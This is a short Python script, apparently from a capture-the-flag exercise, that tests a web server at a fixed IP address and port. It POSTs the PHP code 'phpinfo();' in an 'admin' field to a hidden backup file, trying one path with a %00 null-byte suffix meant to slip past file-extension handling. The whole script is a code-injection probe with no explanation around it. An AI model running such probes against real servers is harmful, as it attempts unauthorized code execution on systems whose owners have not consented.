import requests

host = 'http://61.147.171.35:53451'
files = ['/s3Cr37_f1L3.php.bak%00.php', '/s3Cr37_f1L3.php.bak']
data = {'admin': 'phpinfo();'}

for f in files:
    url = host + f
    print(f'Testing {url}...')
    try:
        r = requests.post(url, data=data, timeout=5)
        print(f'Status: {r.status_code}')
        print(f'Headers: {r.headers}')
        print(f'Content length: {len(r.text)}')
        print(f'Content preview: {r.text[:200]}')
    except Exception as e:
        print(f'Error: {e}')

    print('-' * 20)
